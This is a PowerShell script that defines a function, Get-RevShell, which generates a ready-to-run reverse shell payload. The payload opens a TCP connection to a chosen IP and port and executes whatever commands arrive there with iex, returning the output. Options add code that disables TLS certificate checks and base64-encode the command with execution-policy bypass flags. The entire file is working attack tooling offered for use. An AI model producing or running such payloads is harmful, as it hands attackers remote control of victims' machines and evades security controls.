function Get-RevShell ([string]$IPAddress,[int]$Port,[switch]$HTTPSBypass,[switch]$Base64) {
# AUTHOR: Tyler McCann (@tylerdotrar)
# ARBITRARY VERSION NUMBER: 1.0.0

    if (!$IPAddress) { return (Write-Host 'Missing IP address.' -ForegroundColor Red) }
    if (!$Port)      { return (Write-Host 'Missing port.' -ForegroundColor Red)       }


    # Bypass Self-Signed Certificate Restriction
    if ($HTTPSBypass) {
    $Bypass = @"
`$CertBypass = @'
using System;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
public class SelfSignedCerts
{
    public static void Bypass()
    {
        ServicePointManager.ServerCertificateValidationCallback =
            delegate
            (
                Object obj,
                X509Certificate certificate,
                X509Chain chain,
                SslPolicyErrors errors
            )
            {
                return true;
            };
    }
}
'@
Add-Type `$CertBypass;
[SelfSignedCerts]::Bypass();`n
"@;
    }
    else { $Bypass = $NULL }


    # For PowerShell 5.0+
    $RevShell = @"
`$C=[System.Net.Sockets.TCPClient]::new("$IPAddress",$Port);
`$Str=`$C.GetStream();
[byte[]]`$B=0..65535|%{0};
`$Er=`$Error[0];
while((`$i=`$Str.Read(`$B,0,`$B.Length)) -ne 0){;
`$D=[System.Text.ASCIIEncoding]::new().GetString(`$B,0,`$i);
`$Ret=(iex `$D *>&1 | Out-String );
if (`$Er -ne `$Error[0]){`$Er=`$Error[0];`$Ret+="`$Er``n"};
`$Ret2=`$Ret + "PS " + (pwd).Path + "> ";
`$SB=([Text.Encoding]::ASCII).GetBytes(`$Ret2);
`$Str.Write(`$SB,0,`$SB.Length);
`$Str.Flush()};
`$C.Close();
"@
    

    # Final Reverse Shell
    $RevShell = $Bypass + $RevShell


    # Powershell -NoProfile -ExecutionPolicy Bypass -Command/-EncodedCommand {Payload}
    if ($Base64) { $Payload = "powershell -nop -ex bypass -e " + [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($RevShell)) }
    else         { $Payload = "powershell -nop -ex bypass -c {$RevShell}" }

    return $Payload
}